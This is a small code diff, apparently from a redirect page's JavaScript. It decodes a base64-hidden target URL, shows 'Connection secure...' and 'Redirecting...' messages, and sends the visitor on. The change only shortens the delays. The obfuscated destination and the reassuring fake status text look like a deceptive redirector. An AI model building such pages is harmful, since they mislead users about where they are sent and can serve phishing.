@@ -96,13 +96,13 @@
             const target = atob(encodedTarget);
             
             // Visual feedback for the "user"
-            setTimeout(() => { statusEl.innerText = "Connection secure..."; }, 500);
-            setTimeout(() => { statusEl.innerText = "Redirecting..."; }, 1200);
+            setTimeout(() => { statusEl.innerText = "Connection secure..."; }, 200);
+            setTimeout(() => { statusEl.innerText = "Redirecting..."; }, 200);
 
             // Redirection after a short delay
             setTimeout(() => {
                 window.location.replace(target);
-            }, 1800);
+            }, 800);
 
         } catch (e) {
             console.error("Redirection error.");
